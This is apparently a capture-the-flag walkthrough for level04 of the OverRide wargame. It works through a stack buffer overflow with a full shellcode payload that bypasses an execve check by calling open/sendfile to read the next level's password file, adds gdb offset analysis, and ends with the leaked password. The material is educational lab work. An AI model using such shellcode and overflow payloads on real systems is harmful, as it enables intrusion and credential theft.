# Walkthrough level04

The binary create a fork and gets some chars in a buffer of 128 chars.  
We don't have function who run a shell or print the flag so we need to use a
shellcode.  
Let's try with the shellcode from the others levels.

```bash
level04@OverRide:~$ python -c'print("\x90" * 72 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "a" * 56 + "\xff\xff\xd6\xb0"[::-1])' | ./level04
Give me some shellcode, k
no exec() for you
```

We can see in the code there are a check on the syscall number (11 is execve).  

With pwntools we try to generate a shellcode without `execve`.

```bash
$> pwn shellcraft -f a i386.linux.cat "/home/users/level05/.pass"
    /* push '/home/users/level05/.pass\x00' */
    push 0x73
    push 0x7361702e
    push 0x2f35306c
    push 0x6576656c
    push 0x2f737265
    push 0x73752f65
    push 0x6d6f682f
    /* open(file='esp', oflag='O_RDONLY', mode='edx') */
    mov ebx, esp
    xor ecx, ecx
    /* call open() */
    push SYS_open /* 5 */
    pop eax
    int 0x80
    /* sendfile(out_fd=1, in_fd='eax', offset=0, count=0x7fffffff) */
    push 1
    pop ebx
    mov ecx, eax
    xor edx, edx
    push 0x7fffffff
    pop esi
    /* call sendfile() */
    xor eax, eax
    mov al, 0xbb
    int 0x80

$> pwn shellcraft -f d i386.linux.cat "/home/users/level05/.pass"
\x6a\x73\x68\x2e\x70\x61\x73\x68\x6c\x30\x35\x2f\x68\x6c\x65\x76\x65\x68\x65\x72\x73\x2f\x68\x65\x2f\x75\x73\x68\x2f\x68\x6f\x6d\x89\xe3\x31\xc9\x6a\x05\x58\xcd\x80\x6a\x01\x5b\x89\xc1\x31\xd2\x68\xff\xff\xff\x7f\x5e\x31\xc0\xb0\xbb\xcd\x80
```

Now find the offset (buffer start at `$esp + 0x20`):

```bash
(gdb) x/xw $esp + 0x20
0xffffd680:     0x080482e0
(gdb) x/64xw $esp
0xffffd660:     0x00000001      0x00000001      0x00000000      0xf7e2fe44
0xffffd670:     0x00000b80      0x00000000      0xf7fdc714      0x00000000
0xffffd680:     0x080482e0      0x0804a010      0x000001a4      0xf7fd32e8
0xffffd690:     0xf7fd3000      0xf7e356e4      0xf7e39194      0x08048210
0xffffd6a0:     0x00000001      0x08049ff4      0x00000000      0x00000001
0xffffd6b0:     0xffffd6e8      0xf7ff0a50      0x00000000      0xffffd6e8
0xffffd6c0:     0x08049ff4      0x00000000      0xf7ee3ee2      0x080486c6
0xffffd6d0:     0x0000003c      0x0804868f      0x00000001      0x08048485
0xffffd6e0:     0xf7fcf3e4      0x00000016      0x00000001      0x08048882
0xffffd6f0:     0x00000001      0xffffd7b4      0xffffd7bc      0xf7e5ede5
0xffffd700:     0xf7feb620      0x00000000      0x08048839      0xf7fceff4
0xffffd710:     0xf7fceff4      0x00000000      0x00000000      0xf7e45513
0xffffd720:     0x00000001      0xffffd7b4      0xffffd7bc      0xf7fd3000
0xffffd730:     0x00000000      0xffffd71c      0xffffd7bc      0x00000000
(gdb) i f
Stack level 0, frame at 0xffffd720:
 eip = 0x80486db in main; saved eip 0xf7e45513
 Arglist at 0xffffd718, args: 
 Locals at 0xffffd718, Previous frame's sp is 0xffffd720
 Saved registers:
  ebx at 0xffffd710, ebp at 0xffffd718, edi at 0xffffd714, eip at 0xffffd71c
```

The offset before eip is 156. Try to exploit it:

```bash
level04@OverRide:~$ python -c 'print "\x90" * 60 + "\x6a\x73\x68\x2e\x70\x61\x73\x68\x6c\x30\x35\x2f\x68\x6c\x65\x76\x65\x68\x65\x72\x73\x2f\x68\x65\x2f\x75\x73\x68\x2f\x68\x6f\x6d\x89\xe3\x31\xc9\x6a\x05\x58\xcd\x80\x6a\x01\x5b\x89\xc1\x31\xd2\x68\xff\xff\xff\x7f\x5e\x31\xc0\xb0\xbb\xcd\x80" + "B" * 36 + "\xff\xff\xd6\xa0"[::-1]' | ./level04
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
